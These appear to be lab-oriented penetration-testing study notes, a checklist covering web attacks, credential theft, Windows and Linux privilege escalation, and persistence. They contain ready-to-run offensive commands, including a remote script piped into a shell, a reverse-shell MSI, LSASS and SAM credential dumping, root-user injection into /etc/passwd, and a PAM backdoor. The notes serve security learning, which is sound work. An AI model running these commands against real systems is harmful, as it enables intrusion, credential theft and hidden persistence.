- [ ] **Deserialization:** Attack unsafe **Java/Python/PHP** unmarshaling for code execution.

- [ ] **SSRF:** Abuse server trust to pivot to **internal APIs, cloud metadata (IMDS), or localhost services**.

- [ ] **XXE/XML External Entity:** Parse malicious XML for **file read, XXE blind**, and **DOS**.

- [ ] **API Endpoint Abuse:** Exploit **BOLA/BFLA** (Broken Object/Function Level Auth) and **rate-limit bypass**.

- [ ] **Authentication Bypass:** Exploit **logic flaws** in login flows, abuse **password reset tokens**, manipulate **OAuth state parameters**.

- [ ] **Business Logic Flaws:** Identify **race conditions, insufficient workflow validation, price manipulation** in checkout/transaction flows.

- [ ] **File Upload Vulnerabilities:** Bypass **extension filters**, use **null bytes, double extensions, MIME type confusion** to upload **web shells**.

- [ ] **CAPTCHA Bypass:** Exploit **client-side validation**, reuse **tokens**, automate with **OCR/ML models**, abuse **audio alternatives**.

- [ ] **GraphQL Exploitation:** Perform **introspection queries**, abuse **batching/aliasing** for **DoS**, exploit **nested queries** and **IDOR**.

**Credential Assault:**

- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[[Hydra]]** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[[Hashcat]]** + **[[John_the_Ripper]]** for offline hash cracking.

- [ ] **Password Spray:** Low-and-slow attacks across many accounts to avoid lockout.

- [ ] **Default Creds:** Enumerate and test **factory defaults** (admin/admin, root/root).

- [ ] **MFA Bypass:** Exploit **MFA fatigue, SIM-swap, push notification spoofing**.

- [ ] **Credential Stuffing:** Reuse leaked passwords from **breach corpuses** (HIBP/Dehashed).

**Human Vector & Social Engineering:**

- [ ] **Phishing:** Craft **HTML-smuggled payloads, ISO/LNK loaders, OneNote macros** with pretexting.

- [ ] **Whaling/Spear Phishing:** Target **executives** with personalized, researched lures.

- [ ] **Smishing/Vishing:** Use **SMS/voice** to deliver **URL shorteners, MFA prompts, or fake updates**.

- [ ] **Pretext:** Build **fake contractor, vendor, or IT support** persona to extract credentials verbally.

- [ ] **Watering Hole:** Compromise **public websites** frequented by targets to deliver **malware/tracker**.

**Network Interception & MITM:**

> **📌 Cross-Reference:** ARP spoofing, DNS spoofing, SSL stripping, and MITM techniques are taught in detail in **Module 23: Sniffing & Spoofing** (Stage 4). WiFi evil twin attacks are covered in **Shelf 01: Wireless Network Security**. The techniques here focus on using these as delivery mechanisms for social engineering — review Module 23 first.

- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[[tcpdump]]/Wireshark**.

---

### Topic 2: The Ascension (Privilege Escalation) — 🔬 Practical
[[Topic-3_Privilege-Escalation|📁]]

> [!TIP]
> **Goal:** Move from low-level foothold to administrative control by exploiting system logic.

> [!NOTE]
> ⏱️ **Time Bracket: 2 weeks** — This is the largest and most important topic in Module 13. Week 1 — Windows (9 vectors): service misconfigurations (unquoted paths, weak binary perms, registry perms), DLL hijacking (Procmon for missing DLLs, proxying, side-loading), token impersonation (SeImpersonatePrivilege — GodPotato/PrintSpoofer/SweetPotato — run against your lab immediately), UAC bypass (fodhelper/eventvwr registry hijack, mock directories), registry abuse (AlwaysInstallElevated MSI), scheduled tasks, credential hunting (SAM/SYSTEM hive dump, LSASS procdump+Mimikatz, DPAPI, config files, PSReadLine history), kernel exploits (wesng.py). Week 2 — Linux (9 vectors): SUID/SGID (GTFOBins for every hit), sudo misconfig (NOPASSWD, wildcard abuse, LD_PRELOAD), cron job hijacking (writable script, wildcard tar injection), Linux capabilities (getcap -r /), writable /etc/passwd, NFS no_root_squash, kernel exploits (linux-exploit-suggester-2), config/history leaks, PAM backdoor. Dedicate specific lab VMs to Windows and Linux privesc — do not combine them.

**Windows Privilege Escalation:**

> [!IMPORTANT]
> **Why This Needs Its Own Methodology:** Windows is the dominant enterprise OS. Every red team engagement involves Windows privilege escalation. The six bullets below from the original stub are insufficient — work through each vector with a dedicated lab VM (TryHackMe "Windows PrivEsc" room, HackTheBox Blue/Optimum/Bastard, or build my own intentional misfig VM). **winPEAS** and **PowerUp** automate discovery — but I must understand every finding manually before relying on automation.

**Step 0 — Enumeration (Always First):**

- [ ] **Automated Enumeration:** Run **winPEAS** (`[[WinPEAS]].exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).

- [ ] **Manual Baseline Commands:** On foothold, immediately run:
  - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
  - `whoami /groups` — identify group memberships and integrity level
  - `net user %username%` — full user attributes, password expiry, group membership
  - `systeminfo | findstr /i "os name os version hotfix"` — OS version and installed patches
  - `wmic qfe get hotfixid` — list all patches; cross-reference with missing-patch exploit databases
  - `sc query` — enumerate all running services
  - `tasklist /svc` — processes with associated services
  - `netstat -ano` — active network connections and PIDs (identify locally-listening services)
  - `schtasks /query /fo LIST /v` — all scheduled tasks with owners and paths

**Vector 1: Service Misconfigurations**

- [ ] **Unquoted Service Paths:** When a service binary path contains spaces and is unquoted (e.g., `C:\Program Files\Vuln App\service.exe`), Windows will try `C:\Program.exe` first. If I can write to any parent directory, drop a malicious `Program.exe` to escalate.
  - Discovery: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`
  - Also: PowerUp `Get-UnquotedService`

- [ ] **Weak Service Binary Permissions:** If I can overwrite the service binary itself, replace it with a payload.
  - Discovery: `icacls "C:\path\to\service.exe"` — look for `(W)` or `(F)` for current user or Everyone group

- [ ] **Weak Service Registry Permissions:** Registry key controlling a service's image path. If writable, change the binary path.
  - Discovery: `Get-ACL "HKLM:\System\CurrentControlSet\Services\VulnSvc"`

**Vector 2: DLL Hijacking**

- [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If I can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
  - Discovery: **[[Procmon]]** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs

- [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.

- [ ] **Side-Loading:** High-privileged applications loading DLLs from user-writable locations. Common in enterprise software that runs as SYSTEM but loads plugins from user directories.

**Vector 3: Token Impersonation & Potato Exploits**

- [ ] **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege:** These privileges (held by IIS service accounts, SQL Server service, local service) allow impersonating any token, including SYSTEM. This is the most common path from `NT AUTHORITY\NETWORK SERVICE` → SYSTEM.
  - **PrintSpoofer** (Windows 10/2019+): `PrintSpoofer.exe -i -c powershell.exe` (named pipe impersonation via spoolsv)
  - **JuicyPotato** (Windows Server 2016 and below): requires a CLSID for a COM server running as SYSTEM
  - **GodPotato** (Windows 2012–2022, all versions): `GodPotato.exe -cmd "cmd /c whoami > C:\result.txt"` (abuses DCOM / storage interface)
  - **SweetPotato / BadPotato / RoguePotato**: Versatile potato variants bypassing DCOM activation restrictions
  - Discovery: `whoami /priv` → look for `SeImpersonatePrivilege Enabled`

- [ ] **Token Duplication (SeDebugPrivilege):** With `SeDebugPrivilege`, attach to any running process including LSASS and winlogon.exe, duplicate their tokens, and impersonate SYSTEM or dump credentials.
  - Tools: `incognito.exe`, Meterpreter `getsystem`, custom Win32 token duplicate scripts

- [ ] **Data Extraction via SeBackupPrivilege & SeRestorePrivilege:**
  - `SeBackupPrivilege`: Grants full read access to any file on the system regardless of NTFS permissions.
    - Exploit: Dump SAM and SYSTEM hives directly: `reg save HKLM\SAM C:\temp\sam` & `reg save HKLM\SYSTEM C:\temp\system`, or copy locked `NTDS.dit` via robocopy/diskshadow.
  - `SeRestorePrivilege`: Grants full write access to any file on disk.
    - Exploit: Overwrite service binaries or replace system DLLs / sticky keys (`sethc.exe`) to obtain SYSTEM execution.

- [ ] **SeTakeOwnershipPrivilege:** Allows user to take ownership of any securable object (files, registry keys).
  - Exploit: Take ownership using `takeown /f C:\Windows\System32\utilman.exe` and grant full control via `icacls`, then substitute with payload.

**Vector 4: UAC Bypass Mechanics**

- [ ] **UAC Architecture & Integrity Levels:** User Account Control isolates standard users and elevated administrators via Integrity Levels (Low, Medium, High, System). Standard admin accounts run in Medium Integrity by default; UAC bypasses allow moving from Medium Integrity to High Integrity silently without triggering a Consent UI prompt.

- [ ] **Auto-Elevation Abuse & Registry Hijacking (UACME Project):**
  - Trusted binaries with `autoElevate = true` embedded in their manifest run at High Integrity without prompting if signed by Microsoft.
  - `fodhelper.exe` (Method 33): modifies `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with delegateExecute property.
  - `eventvwr.exe` (Method 32): registry hijack under `HKCU:\Software\Classes\mscfile\shell\open\command`.
  - `sdclt.exe` (Method 45): abuses `HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`.
  - Detection signature: Monitor `Sysmon Event ID 12/13` (Registry Key Create/Set) targeting user registry hives followed immediately by auto-elevating system binaries.

- [ ] **Mock Directories & Path Spoofing:**
  - Windows auto-elevation checks verify if an executable resides in `C:\Windows\System32`.
  - By creating a mock folder with a trailing space using extended path syntax (`\\?\C:\Windows \System32`), an attacker can place a malicious executable or DLL that bypasses the path validation check because the API normalizes the space during evaluation.

- [ ] **Auto-Elevate DLL Hijacking & COM Elevation:**
  - Injecting payloads into search paths of auto-elevating binaries (e.g., `mmc.exe`, `winsat.exe`) that load non-existent system DLLs.
  - Elevated COM interfaces: Abusing `IFileOperation` with COM elevation moniker to copy malicious files into protected directories like `C:\Program Files\` or `C:\Windows\System32\` from Medium integrity.
  - Abusing Microsoft Connection Manager Profile Installer (`cmstp.exe`) with a crafted INF file to trigger elevated execution.

- [ ] **UAC Level Verification:** `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — confirm UAC status (`0` = disabled); check `ConsentPromptBehaviorAdmin` (`0` = elevate silently without prompt).

**Vector 5: Registry Privilege Abuse**

- [ ] **AlwaysInstallElevated:** If both `HKLM` and `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are set to 1, any `.msi` package can be installed as SYSTEM.
  - Discovery: PowerUp `Get-RegistryAlwaysInstallElevated`
  - Exploit: `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > malicious.msi; msiexec /quiet /qn /i malicious.msi`

- [ ] **AutoRun Keys (Persistence → Escalation on Higher-Privilege Login):** Write a payload to a registry run key executed by a higher-privilege user:
  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — requires admin write access but runs for all users
  - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — no special permission, runs as current user (useful for phishing context)

**Vector 6: Scheduled Task Exploitation**

- [ ] **Writable Task Binary:** If a scheduled task runs as SYSTEM but the binary it executes is writable by my user, replace the binary.
  - Discovery: `schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Status"`
  - Then: `icacls "C:\path\to\task\binary.exe"` — check write permission

- [ ] **Task XML Privilege Escalation:** Some tasks stored in `C:\Windows\System32\Tasks\` have weak ACLs — check the task XML directly for the `<RunAs>` element.

- [ ] **Writable Task Directory:** If the task binary isn't present but I can write to its expected path, create the binary there — it will run as SYSTEM on the next scheduled execution.

**Vector 7: Credential Hunting**

- [ ] **SAM/SYSTEM/SECURITY Registry Hives:** On a live system, these are locked. In offline access (or via shadow copies), extract NTLM hashes:
  - `reg save HKLM\SAM C:\sam.hive` + `reg save HKLM\SYSTEM C:\system.hive` → `secretsdump.py -sam sam.hive -system system.hive LOCAL`
  - Or from shadow copy: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\sam.hive`

- [ ] **LSASS Memory Dump:** Dump credentials from LSASS for logged-in accounts (requires SYSTEM or SeDebugPrivilege):
  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → parse offline with **Mimikatz** `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`
  - Mimikatz direct: `privilege::debug; sekurlsa::logonpasswords`
  - Detection: Event ID 4656 (handle to LSASS), Sysmon Event ID 10 (process access)

- [ ] **Credential Manager & DPAPI:** `cmdkey /list` — cached credentials; `vaultcmd /listcreds:"Windows Credentials"`. Decrypt DPAPI blobs with Mimikatz `dpapi::cred` using masterkey.

- [ ] **Configuration File Credential Hunting:**
  - `findstr /si password *.txt *.xml *.ini *.config *.ps1 *.bat`
  - `dir /s /b *pass* *cred* *vnc* *.config 2>nul`
  - `%windir%\Panther\Unattend.xml` — contains base64-encoded admin passwords from OS deployment
  - `C:\inetpub\wwwroot\web.config` — database connection strings often contain cleartext credentials
  - PowerShell history: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

**Vector 8: Kernel & Windows Component Exploits**

- [ ] **Kernel Exploit Identification:** Check OS version (`systeminfo`) against known public kernel privilege escalation exploits. Priority targets:
  - **MS16-032** (Secondary Logon, Windows 7–10): token impersonation via race condition
  - **MS16-075** (Potato, Windows Vista–2016): NTLM relay to local system
  - **HiveNightmare/SeriousSam** (CVE-2021-36934, Windows 10 21H1+): any user can read SAM hive
  - **PrintNightmare** (CVE-2021-34527): Windows Print Spooler code execution as SYSTEM

- [ ] **Exploit Suggester:** After `systeminfo`, paste output into **Windows-Exploit-Suggester-NG** (`wesng.py`): `python wesng.py --update; python wesng.py systeminfo.txt` — cross-references patches against known CVEs.

**Vector 9: Windows Token Privileges & Impersonation (The Potato Family)**

- [ ] **Token Privilege Inspection:** Run `whoami /priv` immediately upon obtaining a Windows shell. Identify high-risk privileges:
  - `SeImpersonatePrivilege` & `SeAssignPrimaryTokenPrivilege`: Standard on service accounts (IIS, MSSQL, Network Service). Allows impersonating tokens of authenticated local clients to escalate directly to `NT AUTHORITY\SYSTEM`.
  - `SeDebugPrivilege`: Allows process debugging — attach to and dump `lsass.exe` memory or inject shellcode into any SYSTEM process.
  - `SeBackupPrivilege` / `SeRestorePrivilege`: Bypass NTFS file system ACLs to read SAM/SYSTEM hives or `NTDS.dit`.
  - `SeTakeOwnershipPrivilege`: Take ownership of protected system binaries, edit ACLs via `icacls`, and replace binaries with payloads.
  - `SeLoadDriverPrivilege`: Load vulnerable signed third-party drivers to execute ring-0 kernel code (BYOVD - Bring My Own Vulnerable Driver).

- [ ] **Impersonation Tooling & Evolution:**
  - **PrintSpoofer & PipePotato:** Abuses the Windows Print Spooler service via named pipe impersonation (`PrintSpoofer.exe -i -c cmd.exe`). Works reliably on Windows 10, 11, Server 2016, and Server 2019.
  - **GodPotato & SweetPotato:** Universal token impersonation using DCOM/RPC on Windows Server 2019 and 2022 where legacy DCOM reflection is patched.
  - **JuicyPotato:** Legacy DCOM reflection for Windows Server 2008/2012/2016 (mitigated on Server 2019+).

**Windows Privesc Lab Targets:**

> [!TIP]
> Work through these in order. Each machine reinforces specific vectors with different difficulty.

| Machine | Platform | Primary Vectors | Key Learning |
| --------------- | ----------- | ---------------------------------------- | ---------------------------------- |
| Blue | HackTheBox | MS17-010 (EternalBlue) | RCE → SYSTEM via kernel exploit |
| Optimum | HackTheBox | HFS RCE → MS16-032 | Exploit suggester workflow |
| Bastard | HackTheBox | Drupal RCE → token impersonation | SeImpersonatePrivilege path |
| Windows PrivEsc | TryHackMe | Service misconfigs, registry, DLL hijack | Structured privesc methodology |
| Steel Mountain | TryHackMe | HFS → PowerUp → unquoted path | Guided Windows privesc walkthrough |
| Alfred | TryHackMe | Jenkins → token impersonation | JuicyPotato/Incognito |
| Retro | HackTheBox | CVE research + credential hunting | Manual credential discovery |
| AccessChk | Personal VM | Custom misconfigs | Build my own vuln lab |

**Active Directory Attacks:**

- [ ] **Kerberoasting:** Extract **TGS tickets** for **service accounts (SPNs)**, crack offline with **hashcat/JtR** to recover **plaintext passwords**.

- [ ] **AS-REP Roasting:** Target accounts with **pre-authentication disabled**, extract **AS-REP hashes** for offline cracking.

- [ ] **Golden/Silver Tickets:** Forge **TGT (Golden)** or **TGS (Silver)** tickets using **krbtgt hash** or **service account hash** for **persistent domain access**.

- [ ] **DCSync Attack:** Abuse **replication rights** to extract **password hashes** from **Domain Controller** without direct access.

- [ ] **BloodHound/SharpHound:** Map **AD trust relationships, ACLs, group memberships** to find **shortest path to Domain Admin**.

- [ ] **NTLM Relay:** Capture **NTLM authentication** and relay to **SMB/LDAP/HTTP** services for **lateral movement**.

- [ ] **Constrained/Unconstrained Delegation:** Abuse **delegation rights** to impersonate **privileged users** across domain services.

**Linux Privilege Escalation:**

> [!IMPORTANT]
> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build my own with intentional misconfigs). **[[LinPEAS]]** and **Linux Smart Enumeration (lse.sh)** automate discovery — but I must understand every finding manually before relying on automation.

**Step 0 — Enumeration (Always First):**

- [ ] **Manual Baseline:** On foothold, immediately run: `id`, `whoami`, `hostname`, `uname -a`, `cat /etc/os-release`, `cat /proc/version`, `env`, `sudo -l`, `cat /etc/crontab`, `ls -la /etc/cron.*`, `find / -perm -4000 -type f 2>/dev/null` (SUID), `find / -perm -2000 -type f 2>/dev/null` (SGID).

- [ ] **Automated Tools:** Run **LinPEAS** (`curl -L https://linpeas.sh | sh`) and **linux-exploit-suggester-2** (`les2.sh`) — read every finding, do not blindly run suggested exploits.

- [ ] **Writable Paths:** Check `find / -writable -type f 2>/dev/null | grep -v proc` — writable files owned by root or executed by root cron jobs are high-value targets.

**Vector 1 — SUID/SGID Binary Abuse:**

- [ ] **Mechanism:** Files with the SUID bit set execute as their owner (usually root) rather than the calling user. Any vulnerability in the program, or any supported feature that spawns a shell or writes files, becomes a root escalation.

- [ ] **Discovery:** `find / -perm -4000 -type f 2>/dev/null` — list every SUID binary on the system. Cross-reference each against **GTFOBins** (`https://gtfobins.github.io`) for known escape techniques.

- [ ] **Common Exploitable Binaries:** `find`, `vim`, `nano`, `cp`, `mv`, `bash`, `python`, `perl`, `awk`, `nmap` (older versions), `env`, `less`, `more`, `man`, `ftp`, `screen`.

- [ ] **PATH Hijacking:** If a SUID binary calls another program using a relative path (e.g., `system("service apache2 start")` without full path), prepend a writable directory to `$PATH` containing a malicious `service` binary.

- [ ] **Shared Object Injection:** If `strace`/`ltrace` shows a SUID binary loading a missing `.so` file from a writable directory, compile a malicious shared object and place it there.

**Vector 2 — sudo Misconfiguration:**

- [ ] **Discovery:** `sudo -l` — lists what the current user can run as root (or other users) without a password or with one.

- [ ] **NOPASSWD Rules:** Any binary listed under `NOPASSWD` is an immediate escalation — check GTFOBins for the exact `sudo` escape method.

- [ ] **Wildcard Abuse:** `sudo /usr/bin/zip *` — if a wildcard is present and the binary interprets arguments as filenames, inject `--unzip-command=sh -c /bin/bash` or similar via specially named files.

- [ ] **LD_PRELOAD Injection:** If `sudo -l` shows `env_keep+=LD_PRELOAD`, compile a malicious shared library and set `sudo LD_PRELOAD=/tmp/evil.so <allowed_program>` to execute code as root before the real program.

- [ ] **Shell Escape via sudo:** Programs that run editors, pagers, or shells (vim, less, more, man, awk, perl, python) frequently allow shell escapes — check GTFOBins for the specific invocation syntax under `sudo`.

**Vector 3 — Cron Job Abuse:**

- [ ] **Discovery:** `cat /etc/crontab`, `ls -la /etc/cron.*`, `crontab -l`, `find / -name "*cron*" 2>/dev/null`, `systemctl list-timers` (systemd). Also monitor `/var/log/syslog` or `/var/log/cron` to identify jobs not visible in standard config files.

- [ ] **Writable Script Hijack:** If a root-owned cron job executes a script that I can write to, replace or append to the script with a reverse shell or setuid bash copy.

- [ ] **Writable Directory in PATH:** If a root cron job calls a binary using a relative name and the cron `PATH` variable includes a directory I can write to, place a malicious binary with the same name in that directory.

- [ ] **Wildcard Injection (cron + tar):** `tar czf /backup.tar.gz /tmp/*` run by root — create files named `--checkpoint=1` and `--checkpoint-action=exec=sh evil.sh` in `/tmp` to inject arbitrary command execution.

- [ ] **Systemd Timers:** Check `systemctl list-timers --all` and inspect the associated `.service` files with `systemctl cat <service>`. If the `ExecStart` path is writable, hijack it.

**Vector 4 — Linux Capabilities Abuse:**

- [ ] **Mechanism:** Linux capabilities divide root privileges into granular units. A binary granted `cap_setuid` can change its UID to 0 without being SUID. This is invisible to standard SUID searches.

- [ ] **Discovery:** `getcap -r / 2>/dev/null` — lists all binaries with assigned capabilities.

- [ ] **High-Value Capabilities:** `cap_setuid+ep`, `cap_net_bind_service+ep`, `cap_net_raw+ep`, `cap_sys_admin+ep`, `cap_dac_override+ep` (override DAC permissions on any file).

- [ ] **Python with cap_setuid:** `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

- [ ] **Perl with cap_setuid:** `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`

**Vector 5 — Writable Files & PATH Hijacking:**

- [ ] **Writable /etc/passwd:** If `/etc/passwd` is world-writable, add a new root user with a known password hash (`openssl passwd -1 password` → `$1$...`): `echo 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd`.

- [ ] **Writable /etc/shadow:** Direct password change for root or any account.

- [ ] **Writable /etc/sudoers or /etc/sudoers.d/:** Add `ALL=(ALL:ALL) NOPASSWD: ALL` for my user.

- [ ] **NFS Root Squash Disabled:** If `/etc/exports` contains a share with `no_root_squash`, mount it from attacker machine as root, create a SUID binary, and execute on target.

**Vector 6 — Kernel Exploits (Last Resort):**

- [ ] **When to Use:** Kernel exploits are noisy, risky (system crash), and should be the last vector tried — after all misconfiguration-based vectors are exhausted.

- [ ] **Identification:** `uname -a` → kernel version → check **linux-exploit-suggester-2** and **searchsploit** for matching CVEs. Verify exploit is tested for my exact distribution and version.

- [ ] **Known Exploits:** Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), DirtyCred (CVE-2022-2588), OverlayFS (CVE-2023-0386), Looney Tunables (CVE-2023-4911). Understand each mechanism rather than running blind.

- [ ] **Compilation on Target:** Many kernel exploits require compiling on the target or a matching system — check `gcc --version` and available headers (`/usr/include`).

**Vector 7 — Environment & Configuration Leaks:**

- [ ] **History Files:** `cat ~/.bash_history`, `cat ~/.zsh_history`, `cat ~/.mysql_history`, `cat ~/.python_history` — frequently contain passwords, commands run as root, or credentials passed as CLI arguments.

- [ ] **Config Files & Credentials:** `find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null` — locate configuration files with embedded credentials.

- [ ] **SSH Keys:** `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` — unprotected private keys can provide lateral movement or privilege escalation.

- [ ] **Database Credentials:** Web application config files (`/var/www/html/config.php`, `wp-config.php`, `database.yml`, `.env`) frequently contain MySQL/PostgreSQL credentials that reuse the root password.

- [ ] **Readable /etc/shadow:** `cat /etc/shadow` — if readable, extract hashes and crack offline with hashcat.

**Vector 8 — Service & Process Exploitation:**

- [ ] **Root-Running Services:** `ps aux | grep root` — identify services running as root that may have vulnerabilities or writable config files.

- [ ] **Writable Service Binaries:** `find /etc/systemd/system/ -writable 2>/dev/null` — writable unit files allow modifying `ExecStart` to execute arbitrary commands as root on next service start/restart.

- [ ] **Weak File Permissions on Critical Binaries:** `ls -la /usr/bin/<service>` — if a service binary is world-writable, replace it.

**Vector 9 — Linux PAM & Authentication Architecture Abuse:**

- [ ] **PAM Configuration Flaws:** Audit `/etc/pam.d/` (`common-auth`, `sudo`, `sshd`) for overly permissive `sufficient` or `optional` configurations.
- [ ] **PAM Backdoor Injection:** Exploit write permissions on `/etc/pam.d/` or `/lib/security/` to insert `pam_exec.so` backdoors (`auth optional pam_exec.so seteuid /tmp/backdoor.sh`) or custom PAM modules that capture plaintext passwords or allow universal login passwords across all local users.

**Linux Privesc Lab Targets (Recommended Practice):**

| Platform | Machine/Room | Primary Vectors Covered |
| ----------- | ----------------------- | ------------------------------------ |
| TryHackMe | "Linux PrivEsc" room | SUID, sudo, cron, capabilities, PATH |
| HackTheBox | Jarvis, Sunday, Shocker | SUID, sudo misconfiguration |
| HackTheBox | Cronos | Cron job hijacking |
| VulnHub | Lin.Security | Comprehensive multipath |
| Local Build | Custom misconfig VM | Build my own with 8 vectors above |

**Container & K8s Breakout:**

> **📌 Cross-Reference:** Container and Kubernetes security is taught in depth in **Module 21: Container & Orchestration Security** (Stage 4). The techniques below provide awareness for system hackers; Module 21 covers the full container attack surface.

- [ ] **Mounted docker.sock:** Escape **container to host** via **Docker socket abuse**.

- [ ] **Privileged Containers:** Escape from **--privileged, CAP_SYS_ADMIN** containers.

- [ ] **hostPath Mounts:** Write to **host filesystem** via mounted volumes for **persistence**.

- [ ] **RBAC/CNI Misconfigs:** Abuse **Kubernetes role bindings** and **network policy gaps**.

**Cloud Platform Attacks:**

- [ ] **AWS IAM Exploitation:** Enumerate **overprivileged roles**, abuse **AssumeRole**, exploit **resource-based policies** for **privilege escalation**.

- [ ] **S3 Bucket Abuse:** Find **public buckets** via **bucket enumeration**, exploit **ACL misconfigs**, steal data from **pre-signed URLs**.

- [ ] **Cloud Metadata Services (IMDS):** Query **169.254.169.254** for **IAM credentials, instance metadata**, use **IMDSv2 bypass** techniques.

- [ ] **Azure AD Exploitation:** Abuse **service principals**, steal **access tokens**, exploit **OAuth consent grants** for lateral movement.

- [ ] **GCP Service Accounts:** Steal **service account keys**, abuse **IAM bindings**, exploit **Compute Engine metadata**.

- [ ] **Lambda/Function Abuse:** Inject code into **serverless functions**, abuse **environment variables**, exfil via **function logs**.

**LOLBAS & Living off the Land:**

- [ ] **Windows:** Abuse **PowerShell, WMI, certutil, bitsadmin, mshta** for **execution and evasion**.

- [ ] **Linux:** Leverage **bash, find, awk, sed, curl, wget** for **lateral movement and persistence**.

---

### Topic 3: The Stronghold (Persistence & Lateral Movement) — 🔬 Practical
[[Topic-4_Execution-and-Persistence|📁]]

> [!TIP]
> **Goal:** Establish permanent presence and move horizontally across network.

> [!NOTE]
> ⏱️ **Time Bracket: 4–6 days** — Days 1–2: Credential harvesting (Pass-the-Hash workgroup: `nxc smb <target> -u administrator -H <NT-hash>`; LSASS dump: procdump + Mimikatz sekurlsa::logonpasswords; browser/token harvesting from SQLite credential stores; SSH key stealing from `~/.ssh/id_rsa` and agent socket hijack). Days 3–4: Windows persistence (Run/RunOnce registry keys, Startup folder, scheduled task as SYSTEM, service installation), Linux persistence (cron job in /etc/crontab, systemd user unit, SSH authorized_keys injection, shell init file injection, LD_PRELOAD hijack, SUID binary planting). Days 5–6: Lateral movement pivoting (Chisel SOCKS5 tunnel: server/client setup + proxychains4 routing; Ligolo-ng TUN interface; SSH dynamic/local/remote port forwarding), egress evasion (DNS tunneling via dnscat2, ICMP exfil, HTTPS CDN fronting). Deliverable: set up Chisel in your lab and route an Nmap scan through a compromised pivot host to an otherwise unreachable subnet.

**Credential Harvesting & Local Authentication Abuse:**

- [ ] **Pass-the-Hash (Workgroup):** Capture **local NTLM hashes** (via SAM or LSASS) and authenticate against adjacent workgroup hosts without cracking passwords. *(Note: Kerberos Pass-the-Ticket and Golden/Silver Tickets are explicitly taught in Stage 4: Module 19).*

- [ ] **LSASS Dumping:** Extract **plaintext credentials and NTLM hashes** via **mimikatz, procdump, comsvcs.dll**, or PowerShell reflection. Understand Credential Guard and PPL protections.

- [ ] **Browser & Token Harvesting:** Extract stored browser credentials and session cookies from disk/memory (`dpapi`, SQLite databases).

- [ ] **SSH Key Harvesting:** Steal **unencrypted private keys** from `~/.ssh/id_rsa`, `known_hosts`, and hijacked SSH agent sockets (`SSH_AUTH_SOCK`).

**Userland & Service Persistence:**

- [ ] **Registry & Autorun Persistence:** Install persistence via Windows **Run/RunOnce keys, Startup folder, or Winlogon Userinit** for automatic re-execution upon login.

- [ ] **Scheduled Tasks & Services:** Configure persistent execution using `schtasks /create` or creating Windows Services (`sc create`) executing as SYSTEM.

- [ ] **Linux Cron & Systemd Persistence:** Install cron jobs (`/etc/crontab`, `/var/spool/cron/crontabs/`) or deploy custom systemd unit services.

- [ ] **SSH & Account Backdoors:** Append attacker public keys to `~/.ssh/authorized_keys` or create backdoor local administrator/sudo users (`net user /add` or `useradd -ou 0 -g 0`).

- [ ] **Web Shell Placement:** Upload lightweight web shells (PHP, ASP.NET, JSP) to writable web roots for out-of-band foothold retention. *(Note: Kernel rootkits and UEFI bootkits are advanced low-level techniques covered in Stage 5 and Shelf).*

**🐧 Linux Persistence Analysis:**

- [ ] **Cron Backdoors:** Add malicious entries to `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/<user>`, or cron hourly/daily/weekly drop dirs. Understand which require root vs user privs. Know the detection artifacts: `auditd` rules on crontab writes, `/var/log/syslog` cron entries, and inotify watches on cron directories.

- [ ] **Shell Init File Injection:** Inject into `~/.bashrc`, `~/.bash_profile`, `~/.profile`, `/etc/profile`, `/etc/bash.bashrc`, or `/etc/profile.d/*.sh` to execute on every user login. Know the difference between interactive vs non-interactive shell loading order. Detect via: file modification timestamps, `md5sum` baselines, auditd file watches.

- [ ] **Systemd Unit Abuse:** Create a malicious `.service` file in `~/.config/systemd/user/` (user-level, no root required) or `/etc/systemd/system/` (system-level, requires root). Understand `WantedBy=multi-user.target` and `Type=forking`. Detect via: `systemctl list-units --state=enabled`, `journalctl -u <service>`, auditd watches on `/etc/systemd/`.

